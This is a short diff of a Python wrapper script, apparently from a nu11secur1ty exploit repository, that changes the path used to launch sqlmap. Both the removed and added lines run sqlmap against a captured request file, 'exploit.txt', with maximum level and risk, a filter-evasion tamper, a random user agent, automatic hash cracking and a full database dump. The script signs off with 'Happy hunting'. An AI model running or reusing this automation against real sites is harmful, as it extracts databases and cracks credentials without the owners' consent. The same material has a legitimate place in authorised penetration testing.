@@ -20,7 +20,7 @@ print(Style.RESET_ALL)
 # Here you can modify your OWN injection construction!
 # Your EXPLOIT ENVIRONMENT 
 env = 'C:\\path\\path\\program'
-os.system('python D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt --tamper=space2comment --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
+os.system('python Y:\\path_to_your_sqlmap-nu11secur1ty\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt --tamper=space2comment --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
 
 print(Fore.RED +"Happy hunting with nu11secur1ty =)")
 print(Style.RESET_ALL)
